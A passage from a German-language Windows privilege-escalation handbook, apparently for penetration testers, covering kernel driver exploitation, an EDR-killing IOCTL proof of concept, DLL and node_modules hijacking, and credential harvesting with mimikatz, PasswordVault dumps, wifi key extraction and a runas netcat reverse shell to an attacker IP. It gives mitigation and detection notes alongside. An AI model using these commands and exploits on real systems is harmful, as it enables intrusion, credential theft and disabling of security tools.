- **Pointer-reiche Refill-Ziele**: Registrierte Buffer-Arrays von Windows-**I/O rings** sind ausgezeichnete Disclosure-Ziele, da ihre paged-pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Pointer auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays und ermittle das umgebende `IORING_OBJECT`; beschädige dann **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-ring-Operationen gefälschte Einträge des Angreifers verwenden und beliebige Kernel-Read/Write ermöglichen. Wenn der einzige verfügbare Schreibzugriff ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Schreibzugriffe**, um einen User-Pointer aus wiederholten Bytes wie `0x0101010101010101` zu erzeugen, mappe ihn mit `VirtualAlloc` und lege das gefälschte Array registrierter Buffer dort ab.<sup>[[30]](#references)</sup>

Nützliche Debugging-Indikatoren:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du aus dem korrumpierten I/O-Ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehl mit dem standardmäßigen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitiven zur Speicherbeschädigung in Registry-Hives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts vorzubereiten, beschreibbare untergeordnete Schlüssel in HKLM/HKU auszunutzen und Metadatenkorruption ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Die vollständige Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Typverwechslung im Direct-Modus von `RtlQueryRegistryValues` über vom Angreifer kontrollierte Pfade

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen anschließend `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` und einem skalaren Stack-Ziel wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` anhand des **tatsächlichen** Registry-Typs interpretiert, nicht anhand des vom Entwickler erwarteten Typs.

Dadurch entstehen zwei nützliche Primitiven:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Über einen vom Benutzer kontrollierten absoluten `\Registry\...`-Pfad kann der Treiber vom Angreifer gewählte Schlüssel abfragen, deren Existenz über Rückgabecodes/Protokolle offenlegen und manchmal Werte lesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherbeschädigung**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder dimensionierter Binärpuffer fehlinterpretiert.

Hinweise zur praktischen Ausnutzung:

- **Abschwächung ab Windows 8**: Trifft die Abfrage auf einen **nicht vertrauenswürdigen Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` abzulegen.
- **Ablage in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare untergeordnete Schlüssel von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity-Token** erneut aus, um Schlüssel zu finden, die aus Sandbox-Kontexten erreichbar sind:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibvorgang von 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im Direct-Modus muss `EntryContext` auf eine `UNICODE_STRING` zeigen. Lädt der Code zuerst ein vom Angreifer kontrolliertes `REG_DWORD` in einen Stack-Skalar und verwendet denselben Puffer anschließend erneut für einen String-Lesevorgang, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst teilweise den `Buffer`-Zeiger. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibvorgang.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der Direct-Modus den ersten `LONG` bei `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesevorgang einen vom Angreifer kontrollierten **negativen** Wert im wiederverwendeten Skalar, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Dies ist häufig der einfachste Weg, einen Callback-Zeiger vollständig zu überschreiben.

Starkes Hunting-Muster: **heterogene Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche mit Grep nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, in denen der erste Registry-Lesevorgang bestimmt, ob ein zweiter erfolgt.

#### Missbrauch von fehlendem FILE_DEVICE_SECURE_OPEN bei Geräteobjekten (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einer strengen SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Gerät über einen Pfad mit einer zusätzlichen Komponente geöffnet wird. Dadurch kann jeder nicht privilegierte Benutzer mit einem Namespace-Pfad wie diesem ein Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation missbrauchen. In freier Wildbahn beobachtete Möglichkeiten:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Raw-Disk-Lese-/Schreibzugriff (Offline-Manipulation, Tricks zur Persistenz beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch sich AV/EDR aus dem Userland über den Kernel beenden lässt.

Minimales PoC-Muster (User-Modus):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigationsmaßnahmen für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Validiere den Kontext des Aufrufers für privilegierte Vorgänge. Führe PP/PPL-Prüfungen durch, bevor du das Beenden eines Prozesses oder die Rückgabe von Handles erlaubst.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe brokerbasierte Modelle anstelle direkter Kernel-Berechtigungen in Betracht.

Erkennungsideen für Verteidiger
- Überwache user-mode-Öffnungen verdächtiger Gerätenamen (z. B. \\ .\\amsdk*) und bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setze Microsofts vulnerable driver blocklist durch (HVCI/WDAC/Smart App Control) und pflege eigene Allow-/Deny-Listen.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Berechtigungen erweitern**.<sup>[[2]](#references)</sup>

Prüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie diese Prüfung ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js- / Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante eines **unkontrollierten Windows-Suchpfads**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen Bare Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Pakete auf, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann dieser Suchlauf bis zur Laufwerkswurzel reichen. Eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wird, könnte daher Folgendes abfragen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen kann, kann er eine bösartige `foo.js`-Datei (oder einen Paketordner) platzieren und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht eine **LPE**, wenn das Ziel als Administrator, über eine Aufgabe mit erhöhten Berechtigungen bzw. einen Service-Wrapper oder über eine automatisch gestartete privilegierte Desktop-App ausgeführt wird.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus den Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- das anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode liegt

### Anfällige Ziele aufspüren

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = Zielprogramm (`node.exe`, die EXE der Electron-App oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Achte auf `NAME NOT FOUND` und den letzten erfolgreichen Zugriff unter `C:\node_modules`

Nützliche Muster bei der Codeprüfung entpackter `.asar`-Dateien oder von Anwendungsquellcode:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **Namen des fehlenden Pakets** mithilfe von Procmon oder durch Überprüfung des Quellcodes.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Lege ein Modul mit dem exakt erwarteten Namen ab:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Starte die Opferanwendung. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, kann Node `C:\node_modules\foo.js` laden.

Reale Beispiele für fehlende optionale Module, auf die dieses Muster zutrifft, sind `bluebird` und `utf-8-validate`. Die **Technik** ist jedoch der wiederverwendbare Teil: Finde einen beliebigen **fehlenden Bare Import**, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennung und Härtung

- Alarmiere, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien oder Pakete ablegt.
- Suche nach Prozessen mit hoher Integrität, die aus `C:\node_modules\*` lesen.
- Bündle alle Laufzeitabhängigkeiten in der Produktion und prüfe die Verwendung von `optionalDependencies`.
- Prüfe Drittanbietercode auf stille Muster wie `try { require("...") } catch {}`.
- Deaktiviere optionale Prüfungen, sofern die Bibliothek dies unterstützt (beispielsweise können manche `ws`-Deployments die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` vermeiden).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe, ob weitere bekannte Computer in der hosts-Datei fest eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Für einen lokalen Listener solltest du seine PID dem Prozesseigentümer, dem ausführbaren Pfad und dem Dienst oder der geplanten Aufgabe zuordnen, die ihn startet. Ein Fernsteuerungsdienst kann nur dann Zugriff als sein Desktop-Benutzer ermöglichen, wenn seine Authentifizierung und Befehlssteuerung dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die mit einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Pfad über eine Speicherbeschädigung eine Analyse genau dieser Binärdatei und ihrer erreichbaren Eingaben erfordert. Wenn ein offener Port einem Systemprozess zu gehören scheint, vergleiche ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor du den Backend-Dienst zuordnest; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere [Befehle zur Netzwerkerkundung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows-Subsystem für Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du Root-Rechte hast, kannst du auf jedem Port lauschen (beim ersten Versuch, mit `nc.exe` auf einem Port zu lauschen, wirst du per GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash einfach als root zu starten, kannst du `--default-user root` verwenden.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

Linux-`root` innerhalb von WSL gewährt für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, überprüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Zugangsdaten gespeichert wurden. Eine Rechteausweitung erfordert weiterhin ein gültiges Konto mit höheren Berechtigungen und einen zulässigen Authentifizierungsweg. Die Verzeichnisstruktur `LocalState\rootfs` gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution häufig auf einer virtuellen Festplatte namens [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Gib bei automatisierten Auflistungen keine Verlaufsinhalte aus.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Zugangsdaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextbefund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA secret speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Lesezugriffe belegen weder, ob dieses Secret existiert, noch, ob es abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Anmeldeinformationsverwaltung / Windows-Tresor

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, die **Windows** nutzen kann, um **Benutzer automatisch anzumelden**. Auf den ersten Blick klingt es vielleicht so, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen, aber so funktioniert es nicht.

Der Windows-Tresor speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen für den Zugriff auf eine Ressource** (einen Server oder eine Website) benötigt, **diesen Credential Manager und den Windows-Tresor verwenden** und die bereitgestellten Anmeldeinformationen nutzen kann, anstatt dass Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben müssen.

Sofern die Anwendungen nicht mit dem Credential Manager interagieren, können sie meiner Meinung nach die Anmeldeinformationen für eine bestimmte Ressource nicht verwenden. Wenn deine Anwendung also den Tresor nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.

Verwende `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Computer aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Anschließend kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel führt eine entfernte Binärdatei über eine SMB-Freigabe aus.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit bereitgestellten Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass dies auch mit mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder mit dem Modul aus [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) möglich ist.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstokens und Klartextpasswörter im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` angezeigt). Dieser Speicherbereich ist von der Sitzung isoliert und kann nativ entschlüsselt werden, ohne Administratorrechte oder `SeDebugPrivilege`.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter auszulesen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird überwiegend im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel eingesetzt. Bei dieser Verschlüsselung wird ein Benutzer- oder Systemgeheimnis verwendet, um maßgeblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Verschlüsselte RSA-Schlüssel von Benutzern werden mithilfe von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` die [Sicherheitskennung](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers bezeichnet. **Der DPAPI-Schlüssel befindet sich zusammen mit dem Hauptschlüssel, der die privaten Schlüssel des Benutzers in derselben Datei schützt**, und besteht in der Regel aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist. Daher können seine Inhalte nicht mit dem Befehl `dir` in CMD aufgelistet werden, wohl aber über PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) entschlüsseln.

Die **durch das Hauptpasswort geschützten Anmeldedateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Du kannst das **mimikatz-Modul** `dpapi::cred` mit dem passenden `/masterkey` verwenden, um die Daten zu entschlüsseln.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele **DPAPI-Masterkeys** aus dem **Speicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, da sich Anmeldeinformationen damit bequem verschlüsselt speichern lassen. Sie werden mit **DPAPI** geschützt und können daher normalerweise nur von demselben Benutzer auf demselben Computer entschlüsselt werden, auf dem sie erstellt wurden.

Eine exportierte Anmeldeinformation kann einen beliebigen Dateinamen oder einen beliebigen `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventur auf eine solche Datei verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` vorauszusetzen: [Windows kann Profile an anderen Orten speichern](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss separat über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfe zuerst Pfade und ACLs, ohne bei der routinemäßigen Aufzählung verschlüsselte oder Klartextwerte auszugeben.

Um eine PS-Anmeldeinformation aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Sie befinden sich unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Zuletzt ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwenden Sie das Mimikatz-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um beliebige .rdg-Dateien zu entschlüsseln\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` können Sie viele DPAPI-Masterkeys aus dem Arbeitsspeicher extrahieren

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuchen Sie lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten des Benutzers, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermitteln Sie das Verbindungsschema und verschlüsselte `Password`-Attribute, bevor Sie eine XML-Datei als Hinweis auf Zugangsdaten behandeln. Der gespeicherte Wert ist kein DPAPI-/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Masterpasswort verwendet wurde. Geben Sie bei einer umfassenden Suche verschlüsselte Werte nicht aus.

**Profil-Exporte von Remote Desktop Plus** können ebenfalls in Benutzerverzeichnissen oder einem gemeinsamen Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Behandeln Sie ein nicht leeres Password-Element als Hinweis auf Zugangsdaten, ohne es auszugeben oder anzunehmen, dass es Klartext enthält: [Der Hersteller weist darauf hin](https://www.donkz.nl/), dass der Profilschutz an das erstellende Konto und den Computer gebunden sein oder weniger streng konfiguriert werden kann. Bestätigen Sie die Herkunft der Datei und die Bedingungen für die Wiederherstellung, bevor Sie sich darauf verlassen.

### Sticky Notes

Benutzer verwenden häufig die Sticky Notes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass es sich dabei um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und sollte immer gesucht und untersucht werden.

Manchmal speichern Benutzer Passwörter und andere Informationen in Haftnotiz-Apps. Die paketierte Sticky Notes-App von Microsoft speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermitteln Sie die installierte App und das Speicherformat, bevor Sie aus einer fehlenden SQLite-Datei schließen, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, kann eine Kopie von `plum.sqlite` allein kürzlich festgeschriebene Notizen auslassen. Bewahren Sie die zugehörige `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und schließen Sie, sofern verfügbar, auch `plum.sqlite-shm` ein; der Shared-Memory-Index kann neu erstellt werden, aber die WAL-Datei gehört zum persistenten Zustand der Datenbank. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein Hinweis auf Zugangsdaten: Überprüfen Sie das Konto, die zulässigen Zugriffsrechte und die Wiederverwendung des Passworts separat. Ein verschlüsselter Eintrag aus einem Passwortmanager erfordert zusätzlich den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er als Nachweis für eine Anmeldung mit höheren Berechtigungen dienen kann.

### AppCmd.exe

**Beachten Sie, dass Sie zum Wiederherstellen von Passwörtern aus AppCmd.exe Administrator sein und die Anwendung mit hoher Integritätsstufe ausführen müssen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) übernommen:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
